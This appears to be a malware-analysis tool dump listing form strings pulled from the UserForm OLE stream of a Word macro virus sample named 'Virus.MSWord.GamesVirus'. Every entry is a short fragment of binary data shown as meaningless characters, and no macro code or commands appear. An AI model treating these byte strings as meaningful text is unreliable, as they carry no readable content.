VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0.1I

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A%)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)($! -)(%) %)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.10$! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Vsi$!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ns�a��Dci4cyEkq2Ri4cq2Ri<c�2RqW{�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a3Zy Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I!Ja;Zq2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I/9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BQ BQ:Ra)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0 BI1JQ&1A'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0%)0&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
610-)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AJI.1($! .1(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O{�`��O{�Y��NsyNsy2RY3Zq!Ji2Rii��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q"Ri)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BQ'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY BQ)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8&18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0%)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0$!I

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q&1Q	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)Y79q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1QAJq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A0Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
798-)(790
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)05)0.1("
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) %)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! .10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$!($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! @BA
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O{�O{�i��4cqO{�W{�*RaO{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba:Rii�� Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9a Ba*Ri BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9QBRY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8)JY2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1A&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8(BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)0.18
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A%)A%)A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A$!8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)8%)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q.1a'9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q%)Q/9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A79q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! %)($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! cZa
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
.1(%)(#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
790F18.10
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)a&1aO{�4cyP��$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r��<cyG{�Fs�a��<caEk�2RaDcy=k�)Ja<cqi��Fs�!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q!Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 2Ra2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
18&1A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8%)I	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 %)A	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I Ba)8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I0BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!0/9i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! -)(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)i-)0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %) 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! $! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!I%)Y,!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!a%)a%)a%)a&1a,!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a%)a.1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0%)a,!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N10&1a&1a%)a%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Y%)Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q$!a%)aP��Ek�)Ja$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��EkqH��Vs�Ns�2Ri*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I4c�3ZqMkyP��j��P��W{� BY2RiDca!JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I*Ri*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ<cq2Ra BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I1Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!A'9Y.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I)Ji(BY79Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Q9Jq-)I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!8(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-) $!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! .1($! 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)aJRQ798%) $!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)Y61A8BY-) &1i%)a&1a%)a$!Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Q.1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$! 61(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)($!(
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-) %)(	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
I$!Q%)YN10%)i&1i.1i&1i%)a=)($!a%)a%)a

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-)i%)a%)a%)i79A$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A=)84!(#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%)a&1a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y%)a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!Y=ky=kyMk�;Zq$!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i��DcyW{�5ky!Ja<cyFs�'9I3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9YFs�|��Q��Y��r��O{�Ns�Eky!JiW{�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Y!Ja3Zq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I1Ja'9Q*Ra)JY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
('9I2Ra
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ah��(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y79i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!IUk�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y(By79I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
! %)i	
